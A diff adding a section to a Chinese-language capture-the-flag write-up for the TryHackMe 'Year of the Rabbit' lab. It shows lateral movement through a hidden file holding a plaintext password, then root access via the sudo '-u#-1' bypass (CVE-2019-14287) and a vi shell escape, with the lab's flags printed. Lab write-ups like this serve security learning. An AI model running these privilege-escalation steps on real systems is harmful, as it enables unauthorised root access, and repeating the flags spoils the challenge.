@@ -285,3 +285,86 @@ drwxr-xr-x  2 gwendoline gwendoline 4.0K Jan 23  2020 gwendoline
 ```
 
 也就是我们需要横向提权到```gwendoline```用户
+
+#再次登录eli账号的时候收到了这条信息
+>1 new message
+>Message from Root to Gwendoline:
+>"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+>END MESSAGE
+
+
+#查找s3cr3t相关信息
+```
+find / -name s3cr3t
+/usr/games/s3cr3t
+find: `/root': Permission denied
+find: `/etc/cups/ssl': Permission denied
+find: `/etc/polkit-1/localauthority': Permission denied
+eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -alh
+total 12K
+drwxr-xr-x 2 root root 4.0K Jan 23  2020 .
+drwxr-xr-x 3 root root 4.0K Jan 23  2020 ..
+-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
+Your password is awful, Gwendoline. 
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+   -Root
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
+```
+
+找到gwendoline的密码是：```MniVCQVhQHUNI```
+
+拿到user.txt
+```
+gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ cat /home/gwendoline/user.txt
+THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
+```
+
+查看sudo -l权限
+```
+gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+
+```
+
+关于```(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt```这条命令，
+All表示本账号可以用任何人的身份运行这条命令
+!root表示本账号不是root账号
+
+此时如果我们用```sudo -u#-1```即可使用```root```权限运行这条命令，因为-u#-1返回的是一个0值，也就是root的id值
+
+以上参考[这篇文章](https://www.exploit-db.com/exploits/47502)
+
+按照[gtfobins](https://gtfobins.github.io/gtfobins/vi/)里vi提权的方法，
+1，我们可以先用vi命令打开这个文件
+
+```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt```
+2，输入
+```
+:set shell=/bin/sh
+```
+3,输入
+```
+:shell
+```
+
+即可提升到root权限
+
+```
+gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
+# 
+```
